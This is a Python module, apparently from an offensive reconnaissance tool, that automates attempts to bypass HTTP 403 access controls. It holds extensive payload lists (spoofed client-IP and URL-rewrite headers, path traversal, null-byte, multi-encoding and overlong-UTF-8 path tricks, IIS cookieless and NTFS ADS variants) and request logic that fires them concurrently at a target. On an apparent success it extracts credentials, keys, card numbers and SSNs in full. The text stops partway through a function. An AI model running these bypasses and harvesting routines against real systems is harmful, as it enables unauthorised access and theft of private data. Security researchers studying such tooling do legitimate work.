"""
ReconBuster 403 Bypass Module - ULTRA ADVANCED Edition
Combines 300+ techniques from: 40XHeaderBypasser, bye403, bypass-403, YA403BT
Plus PayloadsAllTheThings directory traversal and SSRF payloads

ADVANCED TECHNIQUES INCLUDED:
- Path Permutation (payload insertion at every path segment)
- Trim Inconsistency Bypasses (Flask %85/%a0, Node.js %0a/%0c, Spring Boot semicolon)
- IIS Cookieless Session Bypass (S(X), A(X), F(X))
- Case Sensitivity Bypass (Windows vs Linux)
- Fragment/Hash (#) Bypass Techniques
- Double/Triple URL Encoding
- Unicode Normalization Bypass
- JavaScript Unicode Notation (\\u0061)
- Protocol Downgrade (HTTP/1.0)
- Comprehensive Header Manipulation
- Method Override Chaining
- Reverse Proxy vs Application Layer Detection
"""

import asyncio
import aiohttp
import random
import hashlib
import itertools
from typing import List, Dict, Set, Callable, Optional, Tuple
from dataclasses import dataclass, field
from urllib.parse import urlparse, quote, unquote, urlencode
import re
from .utils import (
    AsyncHTTPClient, ScanResult, normalize_url,
    colorize, format_time, USER_AGENTS
)

# ==================== FALSE POSITIVE DETECTION ====================
# Patterns that indicate a false positive (error page, not real content)
FALSE_POSITIVE_PATTERNS = [
    # Generic error messages
    r"page\s*(not|doesn't)\s*exist",
    r"(404|not)\s*found",
    r"invalid\s*(url|path|request|page)",
    r"please\s*(visit|go\s*to|return\s*to)\s*(the\s*)?(home|main|index)",
    r"(redirect|redirecting)\s*to\s*(home|main|index)",
    r"(error|err)\s*(page|occurred|happened)",
    r"(access|permission)\s*(denied|forbidden|restricted)",
    r"(unauthorized|not\s*authorized)",
    r"(something\s*went\s*wrong)",
    r"(oops|sorry).{0,50}(error|wrong|problem)",
    r"(this\s*page|resource)\s*(is\s*)?(not\s*available|unavailable)",
    r"(bad\s*request|malformed)",
    r"(request\s*failed|connection\s*refused)",
    r"(url\s*not\s*valid|invalid\s*endpoint)",
    r"(go\s*back|return)\s*(home|to\s*homepage)",
    # Empty or placeholder content
    r"^\s*$",  # Empty
    r"^[\s\n\r\t]*$",  # Whitespace only
    r"<title>\s*(error|404|403|forbidden|not\s*found|access\s*denied)",
    r"<h1>\s*(error|404|403|forbidden|not\s*found|access\s*denied)",
    # Default server error pages
    r"nginx\s*error",
    r"apache\s*error",
    r"iis\s*error",
    r"tomcat\s*error",
    r"jetty\s*error",
    # Redirect indicators
    r"you\s*(are|will)\s*be\s*redirect",
    r"click\s*here\s*if\s*(you\s*are\s*)?(not\s*)?(auto)?redirect",
    r"window\.location\s*=",
    r"meta\s+http-equiv\s*=\s*['\"]refresh['\"]",
    r"location\.href\s*=",
    r"location\.replace\s*\(",
    # Login/Auth pages (not a bypass if it shows login)
    r"<form[^>]*login",
    r"<input[^>]*type\s*=\s*['\"]password['\"]",
    r"sign\s*in\s*to\s*(continue|access)",
    r"login\s*required",
    r"authentication\s*required",
    r"please\s*(log\s*in|sign\s*in|authenticate)",
    # Default/blank pages
    r"^<!DOCTYPE[^>]*>\s*<html[^>]*>\s*<head[^>]*>\s*</head>\s*<body[^>]*>\s*</body>\s*</html>\s*$",
    r"welcome\s*to\s*(nginx|apache|iis)",
    r"it\s*works!",
    r"test\s*page",
    r"under\s*construction",
    r"coming\s*soon",
    # WAF/Security blocks
    r"access\s*(has\s*been\s*)?(blocked|denied)",
    r"(security|firewall)\s*(check|verification)",
    r"(cloudflare|akamai|incapsula|sucuri)",
    r"captcha",
    r"checking\s*your\s*browser",
    r"ray\s*id",  # Cloudflare
]

# Additional patterns for detecting soft 404s and redirects
SOFT_404_PATTERNS = [
    r"the\s*(page|resource|content)\s*(you\s*(are\s*)?looking\s*for|requested)",
    r"(could|can)\s*not\s*(be\s*)?(found|located)",
    r"no\s*(results?|match|content)\s*(found|available)",
    r"(try|check)\s*(again|later|the\s*url)",
    r"return\s*to\s*(previous|last)\s*page",
    r"(home|main)\s*page",
]

# Patterns indicating legitimate content (positive indicators)
LEGITIMATE_CONTENT_PATTERNS = [
    r"<table[^>]*>.*</table>",  # Data tables
    r"<form[^>]*action\s*=",  # Forms with actions (not login)
    r"class\s*=\s*['\"].*?(admin|dashboard|panel|config|settings)",
    r"<nav[^>]*>.*</nav>",  # Navigation menus
    r"<aside[^>]*>.*</aside>",  # Sidebars
    r"\$\{|\{\{|\{%",  # Template variables (might indicate app content)
    r"api[_-]?key|secret|token|password|credential",  # Sensitive data
    r"(database|db|mysql|postgres|mongo)",
    r"(private|internal|confidential)",
]

# Compiled regex for performance
FALSE_POSITIVE_REGEX = [re.compile(p, re.IGNORECASE) for p in FALSE_POSITIVE_PATTERNS]

# ==================== SENSITIVE DATA PATTERNS ====================
SENSITIVE_PATTERNS = {
    "api_key": [
        r"(?i)(api[_-]?key|apikey)\s*[=:]\s*['\"]?([a-zA-Z0-9_\-]{16,})",
        r"(?i)(access[_-]?token|auth[_-]?token)\s*[=:]\s*['\"]?([a-zA-Z0-9_\-\.]{20,})",
    ],
    "password": [
        r"(?i)(password|passwd|pwd)\s*[=:]\s*['\"]?([^\s'\"]{4,})",
        r"(?i)(secret|secret[_-]?key)\s*[=:]\s*['\"]?([^\s'\"]{8,})",
    ],
    "database": [
        r"(?i)(db[_-]?password|database[_-]?password)\s*[=:]\s*['\"]?([^\s'\"]+)",
        r"(?i)(mysql|postgres|mongodb|redis)://[^\s]+",
        r"(?i)jdbc:[a-z]+://[^\s]+",
    ],
    "aws": [
        r"(?i)AKIA[0-9A-Z]{16}",  # AWS Access Key ID
        r"(?i)(aws[_-]?secret|secret[_-]?access[_-]?key)\s*[=:]\s*['\"]?([a-zA-Z0-9/+=]{40})",
    ],
    "private_key": [
        r"-----BEGIN\s*(RSA|DSA|EC|OPENSSH|PRIVATE)\s*KEY-----",
        r"-----BEGIN\s*PGP\s*PRIVATE\s*KEY",
    ],
    "jwt_token": [
        r"eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+",  # JWT format
    ],
    "email": [
        r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}",
    ],
    "ip_address": [
        r"\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b",
    ],
    "credit_card": [
        r"\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13}|6(?:011|5[0-9]{2})[0-9]{12})\b",
    ],
    "ssn": [
        r"\b\d{3}-\d{2}-\d{4}\b",  # SSN format XXX-XX-XXXX
    ],
    "phone": [
        r"\b(?:\+1[-.\s]?)?\(?[0-9]{3}\)?[-.\s]?[0-9]{3}[-.\s]?[0-9]{4}\b",
    ],
    "admin_path": [
        r"(?i)/admin[^\s]*",
        r"(?i)/dashboard[^\s]*",
        r"(?i)/config[^\s]*",
        r"(?i)/settings[^\s]*",
    ],
    "internal_url": [
        r"(?i)(localhost|127\.0\.0\.1|10\.\d+\.\d+\.\d+|192\.168\.\d+\.\d+|172\.(1[6-9]|2[0-9]|3[01])\.\d+\.\d+)[:/][^\s]*",
    ],
    "file_path": [
        r"(?i)(/etc/passwd|/etc/shadow|/var/log|/home/[a-z]+)",
        r"(?i)(c:\\windows|c:\\users|c:\\program)",
    ],
    "debug_info": [
        r"(?i)(stack\s*trace|traceback|exception|error\s*at\s*line)",
        r"(?i)(debug\s*mode|debug\s*=\s*true|debug_enabled)",
    ],
}

@dataclass
class BypassResult:
    """Result of a 403 bypass attempt"""
    original_url: str
    bypass_url: str
    technique: str
    category: str
    status_code: int
    original_status: int = 403
    content_length: int = 0
    original_content_length: int = 0  # For comparison
    response_time: float = 0.0
    headers_used: Dict = field(default_factory=dict)
    method_used: str = "GET"
    is_bypass: bool = False
    is_verified: bool = False  # True if verified as genuine bypass
    evidence: str = ""
    confidence: str = "low"  # low, medium, high
    content_hash: str = ""
    sensitive_data: List = field(default_factory=list)  # Extracted sensitive info
    reproduction_steps: List = field(default_factory=list)  # Manual steps
    page_title: str = ""
    content_preview: str = ""
    false_positive_reason: str = ""  # Why it was flagged as false positive


class Bypass403:
    """
    ULTRA ADVANCED 403 Forbidden Bypass Engine

    300+ Bypass Techniques including:
    1. Header-based bypasses (80+ headers)
    2. Path manipulation (100+ techniques)
    3. HTTP method switching (40+ methods)
    4. URL encoding variations (single, double, triple)
    5. Protocol manipulation (HTTP/1.0, HTTP/1.1, HTTP/2)
    6. Combined/chained attacks
    7. Path permutation (payload at every segment)
    8. Trim inconsistency bypasses (Flask, Node.js, Spring)
    9. IIS cookieless session bypass
    10. Case sensitivity bypass
    11. Fragment/hash bypass
    12. Unicode normalization bypass
    """

    # ==================== IP SPOOFING HEADERS ====================
    IP_HEADERS = [
        "X-Forwarded-For",
        "X-Originating-IP",
        "X-Remote-IP",
        "X-Remote-Addr",
        "X-Client-IP",
        "X-Real-IP",
        "True-Client-IP",
        "Cluster-Client-IP",
        "X-ProxyUser-Ip",
        "X-Custom-IP-Authorization",
        "Forwarded-For",
        "X-Forwarded",
        "Forwarded",
        "Client-IP",
        "CF-Connecting-IP",
        "Fastly-Client-IP",
        "X-Cluster-Client-IP",
        "X-Forwarded-For-Original",
        # Additional headers
        "X-Azure-ClientIP",
        "X-Backend-IP",
        "X-From-IP",
        "X-Internal-IP",
        "X-Proxy-IP",
        "X-Remote-Host",
        "X-Debug-IP",
        "X-True-IP",
        "X-Originating-Client-IP",
        "X-Akamai-Client-IP",
        "Via",
        "X-Via",
        "True-Client-Ip",
        "X-Cloudflare-CDN-Loop",
        "Cdn-Loop",
        "Cf-Ipcountry",
        "X-Sucuri-Clientip",
    ]

    # IP Values to try - comprehensive list
    IP_VALUES = [
        "127.0.0.1",
        "localhost",
        "127.0.0.1, 127.0.0.2",
        "127.0.0.1:80",
        "127.0.0.1:443",
        "2130706433",  # Decimal representation
        "0x7F000001",  # Hex representation
        "0x7f.0x0.0x0.0x1",  # Dotted hex
        "0177.0000.0000.0001",  # Octal
        "0177.0.0.1",  # Shorthand octal
        "127.1",  # Shorthand
        "127.0.1",  # Shorthand
        "127.000.000.001",  # Padded
        "0",
        "0.0.0.0",
        "10.0.0.1",
        "10.0.0.0",
        "172.16.0.1",
        "192.168.1.1",
        "192.168.0.1",
        "::1",  # IPv6 localhost
        "::ffff:127.0.0.1",  # IPv4-mapped IPv6
        "0000::1",
        "::ffff:7f00:1",  # IPv4-mapped IPv6 hex
        "fe80::1",  # Link-local
        "[::1]",  # Bracketed IPv6
        "::127.0.0.1",  # Mixed notation
        "localhost:80",
        "localhost:443",
        "127.0.0.1.nip.io",  # DNS rebinding style
        "spoofed.127.0.0.1.nip.io",
    ]

    # ==================== URL REWRITE HEADERS ====================
    URL_HEADERS = [
        "X-Original-URL",
        "X-Rewrite-URL",
        "X-Override-URL",
        "X-HTTP-DestinationURL",
        "X-Forwarded-Path",
        "X-Forwarded-Uri",
        "Destination",
        "Request-Uri",
        "X-Original-Uri",
        "X-Custom-URL",
        "X-Proxy-URL",
        "Proxy-URL",
        "Real-IP",
        "Redirect",
        "Referer",  # Sometimes works as URL override
        "X-Backend-URL",
        "X-Request-URL",
        "Uri",
    ]

    # ==================== HOST HEADERS ====================
    HOST_HEADERS = [
        "X-Host",
        "X-Forwarded-Host",
        "Forwarded-Host",
        "X-Forwarded-Server",
        "X-Original-Host",
        "Host",
        "X-HTTP-Host-Override",
        "X-Backend-Host",
        "Proxy-Host",
        "X-Custom-Host",
        "X-Target-Host",
    ]

    # ==================== HTTP METHODS ====================
    HTTP_METHODS = [
        "GET", "POST", "PUT", "DELETE", "PATCH",
        "HEAD", "OPTIONS", "TRACE", "CONNECT",
        # WebDAV methods
        "PROPFIND", "PROPPATCH", "MKCOL", "COPY",
        "MOVE", "LOCK", "UNLOCK", "SEARCH",
        "REPORT", "MKACTIVITY", "CHECKOUT", "MERGE",
        "M-SEARCH", "NOTIFY", "SUBSCRIBE", "UNSUBSCRIBE",
        "PURGE", "LINK", "UNLINK", "ACL",
        # Less common WebDAV
        "BASELINE-CONTROL", "VERSION-CONTROL",
        "UNCHECKOUT", "MKWORKSPACE", "UPDATE", "LABEL",
        # Custom/Test methods
        "FOOBAR", "TEST", "DEBUG", "TRACK", "QUERY",
        # Case variations
        "get", "Get", "gEt", "GeT",
        "post", "Post", "pOsT",
    ]

    # ==================== TRIM INCONSISTENCY PAYLOADS ====================
    # These exploit whitespace handling differences between reverse proxy and app
    TRIM_PAYLOADS = {
        # Flask/Python specific - trims these characters
        "flask": ["%85", "%a0", "%1f", "%04"],
        # Node.js/Express specific
        "nodejs": ["%0a", "%0d", "%0c", "%09", "%20"],
        # Spring Boot/Java specific
        "spring": [";", ";.", ";/", "..;", ";.."],
        # PHP specific
        "php": ["%00", "%0a", "%0d"],
        # General whitespace
        "general": ["%20", "%09", "%0a", "%0b", "%0c", "%0d", "%a0"],
    }

    # ==================== IIS COOKIELESS SESSION ====================
    # Microsoft IIS cookieless session path injection
    IIS_COOKIELESS = [
        "(S(X))",  # Session
        "(A(X))",  # Anonymous ID
        "(F(X))",  # Form ticket
        "(S(X))/(A(Y))",  # Combined
        "(S(lit3rally_telegraphy))",  # Example from research
        "(S(anything))",
        "(A(anything))",
        "(F(anything))",
    ]

    # ==================== PATH MANIPULATION PATTERNS ====================
    PATH_PATTERNS = [
        # Basic variations
        "/{path}",
        "/{path}/",
        "/{path}//",
        "//{path}",
        "//{path}//",
        "///{path}",
        "/{path}///",

        # Dot variations
        "/./{path}",
        "/{path}/.",
        "/{path}./",
        "/{path}/..",
        "/{path}/../{path}",
        "/./{path}/./",
        "/../{path}",
        "/..;/{path}",
        "/{path}/..;/",
        "/{path}..;/",
        "/{path};/",
        "/;/{path}",
        "/.;/{path}",
        "//;/{path}",
        "/.;./{path}",
        "/.;/./{path}",

        # Whitespace/special characters
        "/{path}%20",
        "/{path}%09",
        "/{path}%00",
        "/{path}%0a",
        "/{path}%0d",
        "/{path}%0d%0a",
        " /{path}",
        "/{path} ",

        # Query string tricks
        "/{path}?",
        "/{path}??",
        "/{path}???",
        "/{path}?anything",
        "/{path}?debug=1",
        "/{path}?.css",
        "/{path}?.js",
        "/{path}?.html",
        "/{path}?&",
        "/{path}?%00",
        "/{path}?%0a",

        # Fragment/hash tricks
        "/{path}#",
        "/{path}#anything",
        "/{path}#.",
        "/{path}#/",
        "/{path}%23",
        "/{path}%23/",
        "/{path}%23.",

        # Extension tricks
        "/{path}.html",
        "/{path}.json",
        "/{path}.php",
        "/{path}.css",
        "/{path}.js",
        "/{path}.xml",
        "/{path}.asp",
        "/{path}.aspx",
        "/{path}.txt",
        "/{path}.pdf",
        "/{path}.png",
        "/{path}.ico",
        "/{path}....json",
        "/{path}%00.json",
        "/{path}/.json",
        "/{path}..json",
        "/{path}.randomext",

        # Single URL encoding
        "/%2e/{path}",
        "/%2e%2e/{path}",
        "/{path}%2f",
        "/{path}%2f/",
        "/%2e/{path}%2f",
        "/%2F{path}",
        "/{path}%2F",
        "/%2e%2e%2f{path}",
        "/%2e%2e/{path}",

        # Double URL encoding
        "/%252e/{path}",
        "/%252e%252e/{path}",
        "/{path}%252f",
        "/{path}%252f/",
        "/%252e%252e%252f{path}",
        "/%252F{path}",
        "/{path}%252F",

        # Triple URL encoding
        "/%25252e/{path}",
        "/%25252e%25252e/{path}",
        "/{path}%25252f",

        # Backslash variations
        "/..%5c{path}",
        "/{path}%5c",
        "/%5c{path}",
        "/..%255c{path}",
        "/{path}%5c..%5c",
        "\\{path}",
        "{path}\\",
        "/..\\{path}",

        # Null byte injection
        "/..%00/{path}",
        "/{path}%00",
        "/{path}%00.html",
        "/{path}%00.json",
        "/..%00%2f{path}",

        # Semicolon path parameters (Java environments)
        "/{path};foo=bar",
        "/{path};/",
        "/{path};.css",
        "/{path};.js",
        "/{path};x=y",
        "/{path};a=b;c=d",
        "/;/{path}",
        "/;x=/{path}",
        "/.;/{path}",
        "/.;x=/{path}",

        # Special characters
        "/{path}~",
        "/{path}@",
        "/{path}*",
        "/{path}!",
        "/{path}$",
        "/{path}&",
        "/{path}+",
        "/{path}=",

        # Unicode/UTF-8 tricks
        "/%ef%bc%8f{path}",  # Fullwidth solidus
        "/%c0%af{path}",  # Overlong encoding
        "/%c0%2f{path}",  # Overlong
        "/%e0%80%af{path}",  # Overlong
        "/{path}%c0%af",
        "/%c1%1c{path}",
        "/%c1%9c{path}",

        # Case manipulation
        "/{PATH}",  # Uppercase
        "/{Path}",  # Mixed case
        "/{pAtH}",  # SpongeBob case

        # Protocol relative
        "///{path}",
        "////{path}",

        # IIS specific
        "/{path}.xxx",  # IIS ignores unknown extensions
        "/{path}::$DATA",  # NTFS ADS
        "/{path}::$INDEX_ALLOCATION",

        # Mix patterns
        "/{path}/./",
        "//{path}/..",
        "/./{path}//",
        "/..//../{path}",
    ]

    # ==================== UNICODE NORMALIZATION PAYLOADS ====================
    UNICODE_PAYLOADS = {
        "/": [
            "%2f", "%252f", "%25252f",  # URL encoded
            "%c0%af", "%e0%80%af", "%c0%2f",  # Overlong UTF-8
            "%ef%bc%8f",  # Fullwidth solidus
            "\u2215",  # Division slash
            "\u2044",  # Fraction slash
            "\uff0f",  # Fullwidth solidus
        ],
        ".": [
            "%2e", "%252e", "%25252e",  # URL encoded
            "%c0%ae",  # Overlong UTF-8
            "\uff0e",  # Fullwidth full stop
            "\u2024",  # One dot leader
        ],
        ";": [
            "%3b", "%253b",  # URL encoded
        ]
    }

    # ==================== JAVASCRIPT UNICODE NOTATION ====================
    # For bypassing WAFs that check strings
    JS_UNICODE = {
        "a": "\\u0061",
        "d": "\\u0064",
        "m": "\\u006d",
        "i": "\\u0069",
        "n": "\\u006e",
        "/": "\\u002f",
        ".": "\\u002e",
    }

    def __init__(self, target_url: str, callback: Callable = None,
                 threads: int = 30, timeout: int = 10,
                 verify_ssl: bool = False, aggressive: bool = True):
        self.target_url = normalize_url(target_url)
        self.callback = callback
        self.threads = threads
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.aggressive = aggressive  # Enable all advanced techniques

        # Parse URL components
        parsed = urlparse(self.target_url)
        self.scheme = parsed.scheme
        self.host = parsed.netloc
        self.path = parsed.path or "/"
        self.base_url = f"{self.scheme}://{self.host}"

        # Parse path segments for permutation attacks
        self.path_segments = [s for s in self.path.split('/') if s]

        self.results: List[BypassResult] = []
        self.successful_bypasses: List[BypassResult] = []
        self.original_response: Optional[ScanResult] = None
        self.original_hash: str = ""

        # Stats
        self.stats = {
            "total_attempts": 0,
            "successful_bypasses": 0,
            "header_bypasses": 0,
            "path_bypasses": 0,
            "method_bypasses": 0,
            "permutation_bypasses": 0,
            "trim_bypasses": 0,
            "iis_bypasses": 0,
            "unicode_bypasses": 0,
            "errors": 0
        }

    async def emit(self, event: str, data: dict):
        """Emit event to callback"""
        if self.callback:
            await self.callback(event, data)

    async def bypass(self) -> List[BypassResult]:
        """Main bypass method - runs all techniques including advanced ones"""
        await self.emit("status", {
            "message": f"Starting ULTRA ADVANCED 403 bypass on {self.target_url}",
            "target": self.target_url
        })

        # Get original response for comparison
        await self._get_original_response()

        if not self.original_response:
            await self.emit("error", {"message": "Cannot reach target URL"})
            return []

        await self.emit("original", {
            "status": self.original_response.status_code,
            "length": self.original_response.response_length,
            "hash": self.original_hash
        })

        # Run all bypass techniques concurrently
        bypass_tasks = [
            self._header_bypasses(),
            self._path_bypasses(),
            self._method_bypasses(),
            self._combined_bypasses(),
        ]

        # Add advanced techniques if aggressive mode enabled
        if self.aggressive:
            bypass_tasks.extend([
                self._path_permutation_bypasses(),
                self._trim_inconsistency_bypasses(),
                self._iis_cookieless_bypasses(),
                self._case_sensitivity_bypasses(),
                self._unicode_normalization_bypasses(),
                self._fragment_hash_bypasses(),
                self._advanced_header_bypasses(),
                self._protocol_manipulation_bypasses(),
            ])

        await asyncio.gather(*bypass_tasks, return_exceptions=True)

        # Filter and deduplicate results
        self._filter_results()

        await self.emit("complete", {
            "results": [r.__dict__ for r in self.successful_bypasses],
            "stats": self.stats
        })

        return self.successful_bypasses

    async def _get_original_response(self):
        """Get original response for baseline comparison"""
        async with AsyncHTTPClient(timeout=self.timeout, verify_ssl=self.verify_ssl) as client:
            self.original_response = await client.get(self.target_url)
            if self.original_response:
                self.original_hash = self.original_response.content_hash

    async def _make_request(self, url: str, method: str = "GET",
                           headers: Dict = None, technique: str = "",
                           category: str = "") -> Optional[BypassResult]:
        """Make a single bypass attempt with enhanced verification"""
        self.stats["total_attempts"] += 1

        try:
            connector = aiohttp.TCPConnector(ssl=self.verify_ssl)
            timeout = aiohttp.ClientTimeout(total=self.timeout)

            request_headers = {
                "User-Agent": random.choice(USER_AGENTS),
                "Accept": "*/*",
                "Connection": "close"
            }

            if headers:
                request_headers.update(headers)

            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                async with session.request(
                    method=method,
                    url=url,
                    headers=request_headers,
                    allow_redirects=False
                ) as response:
                    content = await response.text()
                    content_hash = hashlib.md5(content.encode()).hexdigest()

                    # Get original content length for comparison
                    original_length = self.original_response.response_length if self.original_response else 0

                    result = BypassResult(
                        original_url=self.target_url,
                        bypass_url=url,
                        technique=technique,
                        category=category,
                        status_code=response.status,
                        original_status=self.original_response.status_code if self.original_response else 403,
                        content_length=len(content),
                        original_content_length=original_length,
                        headers_used=headers or {},
                        method_used=method,
                        content_hash=content_hash
                    )

                    # Check if bypass successful with false positive detection
                    if self._is_bypass_successful(result, content):
                        result.is_bypass = True
                        result.is_verified = True

                        # Extract page title
                        result.page_title = self._extract_page_title(content)

                        # Extract sensitive data from bypassed content
                        result.sensitive_data = self._extract_sensitive_data(content)

                        # Calculate confidence with content analysis
                        result.confidence = self._calculate_confidence(result, content)

                        # Extract evidence
                        result.evidence = self._extract_evidence(content)

                        # Store content preview
                        result.content_preview = content[:2000]

                        # Generate reproduction steps
                        result.reproduction_steps = self._generate_reproduction_steps(result)

                        self.successful_bypasses.append(result)
                        self.stats["successful_bypasses"] += 1

                        await self.emit("bypass_found", {
                            "technique": technique,
                            "category": category,
                            "url": url,
                            "status": result.status_code,
                            "confidence": result.confidence,
                            "verified": result.is_verified,
                            "page_title": result.page_title,
                            "content_length": result.content_length,
                            "original_content_length": result.original_content_length,
                            "sensitive_data_count": len(result.sensitive_data),
                            "reproduction_steps": result.reproduction_steps
                        })

                    return result

        except Exception as e:
            self.stats["errors"] += 1
            return None

    def _is_bypass_successful(self, result: BypassResult, content: str) -> bool:
        """Determine if bypass was successful with false positive detection"""
        # Status code changed from 403/401 to 200
        if result.original_status in [401, 403] and result.status_code == 200:
            # Check content is different (not false positive)
            if result.content_hash != self.original_hash:
                # Verify it's not a false positive
                is_false_positive, reason = self._detect_false_positive(content)
                if is_false_positive:
                    result.false_positive_reason = reason
                    return False
                return True

        # Status code changed to redirect (potential bypass)
        if result.original_status in [401, 403] and result.status_code in [301, 302, 307, 308]:
            return True

        return False

    def _detect_false_positive(self, content: str, response_headers: Dict = None) -> Tuple[bool, str]:
        """
        Advanced false positive detection with multi-layer analysis
        Returns: (is_false_positive, reason)
        """
        if not content:
            return True, "Empty response body"

        content_stripped = content.strip()

        # Check 1: Content length thresholds
        if len(content_stripped) < 100:
            return True, f"Content too short ({len(content_stripped)} bytes)"

        # Check 2: Empty HTML structure
        html_body_match = re.search(r'<body[^>]*>(.*?)</body>', content, re.IGNORECASE | re.DOTALL)
        if html_body_match:
            body_content = html_body_match.group(1).strip()
            # Strip HTML tags from body
            body_text = re.sub(r'<[^>]+>', '', body_content)
            body_text = re.sub(r'\s+', ' ', body_text).strip()
            if len(body_text) < 50:
                return True, f"Empty or minimal body content ({len(body_text)} chars of text)"

        # Check 3: False positive patterns
        content_lower = content.lower()
        for pattern in FALSE_POSITIVE_REGEX:
            try:
                match = pattern.search(content_lower)
                if match:
                    matched_text = match.group(0)[:60]
                    return True, f"Error pattern: '{matched_text}'"
            except:
                continue

        # Check 4: Soft 404 patterns
        for pattern in SOFT_404_PATTERNS:
            try:
                if re.search(pattern, content_lower):
                    return True, f"Soft 404 detected"
            except:
                continue

        # Check 5: Meta refresh redirect
        meta_refresh = re.search(r'<meta[^>]*http-equiv\s*=\s*["\']?refresh["\']?[^>]*content\s*=\s*["\']?\d+;\s*url\s*=', content, re.IGNORECASE)
        if meta_refresh:
            return True, "Meta refresh redirect detected"

        # Check 6: JavaScript redirect
        js_redirect_patterns = [
            r'window\.location\s*=',
            r'location\.href\s*=',
            r'location\.replace\s*\(',
            r'window\.location\.replace\s*\(',
            r'document\.location\s*=',
        ]
        for pattern in js_redirect_patterns:
            if re.search(pattern, content):
                return True, "JavaScript redirect detected"

        # Check 7: Page title analysis
        title_match = re.search(r'<title[^>]*>([^<]+)</title>', content, re.IGNORECASE)
        if title_match:
            title = title_match.group(1).lower().strip()
            error_titles = [
                'error', '404', '403', 'forbidden', 'not found', 'access denied',
                'unauthorized', 'permission denied', 'page not found', 'invalid',
                'redirect', 'login', 'sign in', 'authenticate'
            ]
            for error in error_titles:
                if error in title:
                    return True, f"Error/auth page title: '{title[:50]}'"

        # Check 8: Compare with homepage content similarity
        # If the content is too similar to what a homepage would have
        homepage_indicators = [
            r'welcome\s+to\s+our',
            r'<header[^>]*class\s*=\s*["\'].*main.*header',
            r'<footer[^>]*class\s*=\s*["\'].*main.*footer',
        ]

        # Check 9: Content hash comparison with original
        # If content is same as original 403, it's a false positive
        if hasattr(self, 'original_hash') and self.original_hash:
            current_hash = hashlib.md5(content.encode()).hexdigest()
            if current_hash == self.original_hash:
                return True, "Content identical to original 403 response"

        # Check 10: Look for positive indicators (legitimate content)
        has_positive_indicators = False
        for pattern in LEGITIMATE_CONTENT_PATTERNS:
            try:
                if re.search(pattern, content, re.IGNORECASE | re.DOTALL):
                    has_positive_indicators = True
                    break
            except:
                continue

        # If no positive indicators and content is small, mark as suspicious
        if not has_positive_indicators and len(content_stripped) < 500:
            # Double check - extract text content
            text_only = re.sub(r'<[^>]+>', '', content)
            text_only = re.sub(r'\s+', ' ', text_only).strip()
            # Check if most of text is generic
            generic_words = ['click', 'here', 'back', 'home', 'return', 'error', 'page']
            word_count = len(text_only.split())
            generic_count = sum(1 for word in text_only.lower().split() if word in generic_words)
            if word_count > 0 and generic_count / word_count > 0.3:
                return True, "Content appears to be generic error/redirect page"

        return False, ""

    def _calculate_confidence(self, result: BypassResult, content: str) -> str:
        """Calculate bypass confidence level with content analysis"""
        if result.status_code == 200:
            # High confidence if:
            # 1. Content is substantial
            # 2. Contains sensitive data
            # 3. Has meaningful page title (not error)
            # 4. Significantly different from original
            score = 0

            if result.content_length > 1000:
                score += 3
            elif result.content_length > 500:
                score += 2
            elif result.content_length > 100:
                score += 1

            # Check if sensitive data was found
            if result.sensitive_data:
                score += 3

            # Check content length difference
            if self.original_response:
                length_diff = abs(result.content_length - self.original_response.response_length)
                if length_diff > 500:
                    score += 2

            # Check for admin/dashboard keywords
            admin_keywords = ['admin', 'dashboard', 'panel', 'control', 'settings', 'config', 'manage', 'users']
            content_lower = content.lower()
            for keyword in admin_keywords:
                if keyword in content_lower:
                    score += 1
                    break

            if score >= 5:
                return "high"
            elif score >= 3:
                return "medium"

        return "low"

    def _extract_evidence(self, content: str) -> str:
        """Extract evidence from response"""
        # Get first 500 chars of content, cleaned up
        evidence = content[:500].replace('\n', ' ').replace('\r', ' ').strip()
        # Remove excessive whitespace
        evidence = re.sub(r'\s+', ' ', evidence)
        return evidence

    def _extract_page_title(self, content: str) -> str:
        """Extract page title from HTML content"""
        title_match = re.search(r'<title[^>]*>([^<]+)</title>', content, re.IGNORECASE)
        if title_match:
            return title_match.group(1).strip()[:100]
        return ""

    def _extract_sensitive_data(self, content: str) -> List[Dict]:
        """Extract sensitive data from bypassed page content"""
        findings = []

        for category, patterns in SENSITIVE_PATTERNS.items():
            for pattern in patterns:
                try:
                    matches = re.findall(pattern, content, re.IGNORECASE)
                    for match in matches[:5]:  # Limit to 5 matches per pattern
                        if isinstance(match, tuple):
                            value = match[-1] if len(match) > 1 else match[0]
                        else:
                            value = match

                        # Mask sensitive data partially
                        if len(str(value)) > 8:
                            masked = value[:4] + '*' * (len(value) - 8) + value[-4:]
                        else:
                            masked = value[:2] + '*' * (len(value) - 2)

                        findings.append({
                            "category": category,
                            "pattern": pattern[:50],
                            "value_masked": masked,
                            "value_full": value,  # Full value for report
                            "severity": self._get_sensitive_severity(category)
                        })
                except Exception:
                    continue

        # Deduplicate by value
        seen = set()
        unique_findings = []
        for f in findings:
            if f["value_full"] not in seen:
                seen.add(f["value_full"])
                unique_findings.append(f)

        return unique_findings[:20]  # Limit total findings

    def _get_sensitive_severity(self, category: str) -> str:
        """Get severity level for sensitive data category"""
        critical = ["private_key", "aws", "database", "password", "credit_card", "ssn"]
        high = ["api_key", "jwt_token"]
        medium = ["email", "internal_url", "file_path", "debug_info"]

        if category in critical:
            return "critical"
        elif category in high:
            return "high"
        elif category in medium:
            return "medium"
        return "low"

    def _generate_reproduction_steps(self, result: BypassResult) -> List[str]:
        """Generate manual reproduction steps for the bypass"""
        steps = []

        # Step 1: Basic info
        steps.append(f"1. Original URL that returned {result.original_status}: {result.original_url}")

        # Step 2: Based on technique category
        if result.category == "header_ip_spoof" or result.category == "header_url_rewrite" or "header" in result.category:
            header_str = ", ".join([f'"{k}: {v}"' for k, v in result.headers_used.items()])
            steps.append(f"2. Send a request with the following header(s): {header_str}")
            steps.append(f"3. cURL command:")
            curl_headers = " ".join([f'-H "{k}: {v}"' for k, v in result.headers_used.items()])
            steps.append(f'   curl -i {curl_headers} "{result.bypass_url}"')

        elif result.category == "path_manipulation" or result.category == "path_permutation":
            steps.append(f"2. Modify the URL path to: {result.bypass_url}")
